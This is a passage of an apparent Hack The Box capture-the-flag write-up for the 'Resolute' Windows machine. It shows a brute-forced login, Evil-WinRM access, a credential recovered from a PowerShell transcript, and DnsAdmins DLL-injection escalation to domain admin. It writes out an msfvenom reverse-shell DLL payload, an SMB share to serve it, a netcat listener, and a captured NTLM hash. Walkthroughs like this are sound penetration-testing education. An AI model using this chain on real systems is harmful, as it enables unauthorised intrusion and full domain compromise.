[STATUS] 12.50 tries/min, 25 tries in 00:02h, 2 to do in 00:01h, 1 active
[STATUS] 8.33 tries/min, 25 tries in 00:03h, 2 to do in 00:01h, 1 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-06 20:17:38


```



##Initial Foothold

Now that we have the username/password *melanie/Welcome123!*, we’ll use the [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) script to gain an initial foothold on the box.


```
root@kali:~/htb/resolute$ evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!'
```

We get a shell!

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/user.png)

Grab the user.txt flag.

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/user_flag.png)

##Privilege Escalation

Now lets obtain the user permission.


```
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Current Users permission are very common.
Lets enumerate more.
I have Found a hidden folder containing the txt file.
![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/hidden.png)

Lets read the file

```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/creds.png)

I got another credential for `ryan` user.

Now Lets login with the `ryan` user using `evil-winrm`
![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/note.png)

I got a note.txt which includes hint to escalate our privileges.

Lets grab the permission group to which user belongs.
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

**Ryan** user belongs to DnsAdmin group.
We can escalate our user privileges like **DNSAdmins to Domain Admins** using  server level DLL injection technique.


Putting all the pieces together, the following is our attack path.:

- Making a dll payload that sends a reverse shell back to our machine with msfvenom.
- Serving it using SMB Server to make it available to the Windows machine.  
- Setup a netcat listener to catch our reverse shell.
- Importing that dll in the DNS Server.
- Restarting the DNS Server so that it loads the dll file.

Alright, let’s get started.

Lets make a payload

`root@kali:~/htb/resolute$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4444 --platform=windows -f dll > plugin.dll
`

Now, Lets serve our payload using [smbserver.py](https://github.com/SecureAuthCorp/impacket) 

`smbserver.py resolute ~/htb/resolute/`

In another terminal tab, set up a netcat listener to catch the reverse shell

`nc -lvp 4444`

Now, in the compromised Windows machine run the following series of command.

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/dll.png)

Observe the smb log.

```
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,53053)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:2ed16af8e796d6b1176eeb22393f4962:01010000000000000016f5a74025d60199bb169eb052f44500000000010010005200430057005a006e006d006200680002001000510073006e004f006300720043007100030010005200430057005a006e006d006200680004001000510073006e004f006300720043007100070008000016f5a74025d601060004000200000008003000300000000000000000000000004000005ef8595e750dceb213ef48f95cdf6646e1eaca98af7a162f8df751cf02ec78920a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320031000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:RESOLUTE)
[*] Closing down connection (10.10.10.169,53053)
[*] Remaining connections []
```

Now, go back and check the netcat listener, I got the reverse shell..!!

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/shell.png)

Lets grab the *root.txt* flag.

![alt text](https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/root.png)

Rooted :) Your feedback is appreciated !
